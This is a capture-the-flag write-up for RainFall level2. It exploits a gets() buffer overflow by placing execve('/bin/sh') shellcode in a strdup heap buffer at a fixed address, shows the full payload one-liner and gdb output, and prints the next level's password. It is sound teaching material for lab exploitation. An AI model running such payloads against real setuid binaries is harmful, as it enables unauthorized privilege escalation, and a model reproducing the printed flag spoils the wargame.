# Level2

As in level1, we can find an executable waiting for an input, print it and quit after press enter
```
level2@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
level2@RainFall:~$ ./level2
bla
bla
level2@RainFall:~$
```
After analyze it with gdb we can see that the `main()` function call a function named `p()`.  
Please refer to file [asm_analysis.md](https://github.com/maxisimo/42-RainFall/blob/main/level2/Ressources/asm_analysis.md) in parallel of [source.c](https://github.com/maxisimo/42-RainFall/blob/main/level2/source.c) for more details.  
<br/>

Let focus on the `p()` function.  
As in level1, we can see a call to `gets()` function wich is vulnerable to buffer overflow attack.  
A check is made to make sure we dont overwrite the return address to an adress on the stack
```
   0x080484fb <+39>:    and    eax,0xb0000000
   0x08048500 <+44>:    cmp    eax,0xb0000000
```
The restriction on our return address appears to be anything that starts with the the bit ‘b’ (indicated by the ‘and’ calculation with the value "0xb0000000").  
Due to this check we couldn't point the return address to the stack (0xbf000000 - 0xbfffffff range). This avoids having a shellcode stored on the stack or in environment variable.  
But if we can't use the stack we can use the heap !  
We see in the program that the buffer is later copied inside a strdup. This function use malloc who store the memory in ... the heap.
```
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
```
We can see that malloc always return the address `0x804a008` :
```
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                               = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)    = 0xbffff6fc
puts("")                                         = 1
strdup("")                                       = 0x0804a008
+++ exited (status 8) +++
level2@RainFall:~$
```
Now we can try to copy a shellcode in the heap by writing it in the input prompt and then write the allocated address (malloc) on the return address.  
*shellcode found [here](http://shell-storm.org/shellcode/files/shellcode-575.php)*  
`\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`  
Let's find the offset to write over the `eip` address (return address) :
```
level2@RainFall:~$ gdb level2
(gdb) run
Starting program: /home/user/level2/level2 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) info register eip
eip            0x37634136       0x37634136
(gdb)
```
Thanks to the pattern generator we found that the offset of `eip` start at 80.  
Since our shellcode is 21 bytes long we could pad the back with any byte sequence, until 80 bytes then 4 last bytes for the return adress.  
Our final attack buffer will look like :  
- shellcode 			: 21 bytes
- pad of arbitrary data : 59 bytes
- return address		: 4 bytes
```
level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit

level2@RainFall:~$ cat /tmp/exploit - | ./level2
j
 XRh//shh/bin1̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
whoami
level3
cat /home/user/level3/.pass  
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
^C
level2@RainFall:~$ su level3
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
level3@RainFall:~$
```
Level2 passed!
